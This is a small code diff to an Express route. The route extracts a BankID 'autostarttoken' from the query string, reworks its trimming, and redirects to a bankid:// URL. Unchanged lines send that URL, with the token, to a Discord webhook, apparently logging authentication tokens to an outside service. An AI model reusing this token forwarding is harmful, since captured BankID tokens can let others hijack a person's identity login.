@@ -20,19 +20,19 @@ app.get('/', (req, res) => {
     return res.status(400).send('Invalid URL');
   }
 
-  // Extract the autostarttoken parameter from the query string
-  const autostarttoken = queryString.substring(2); // Remove the leading '/?'
+  // Extract the autostarttoken parameter from the query string and trim leading '/?'
+  let autostarttoken = queryString.replace(/^\/?\?/, '');
 
   // Check if autostarttoken is defined
   if (!autostarttoken) {
     return res.status(400).send('Missing autostarttoken parameter');
   }
 
-  // Trim trailing '=' characters from autostarttoken
-  const trimmedToken = autostarttoken.replace(/=+$/, '');
+  // Remove trailing '=' before '&'
+  autostarttoken = autostarttoken.replace(/=(&|$)/g, '$1');
 
   // Construct the redirect URL with formatted query parameters
-  const redirectUrl = `bankid:///?autostarttoken=${trimmedToken}`;
+  const redirectUrl = `bankid:///?autostarttoken=${autostarttoken}`;
 
   // Log the redirect URL to Discord webhook (replace with your webhook function)
   sendDiscordWebhook(redirectUrl);
@@ -40,6 +40,7 @@ app.get('/', (req, res) => {
   // Redirect to the constructed URL
   res.redirect(redirectUrl);
 });
+
 
   // Function to send Discord webhook
 async function sendDiscordWebhookEmbed(embed) {
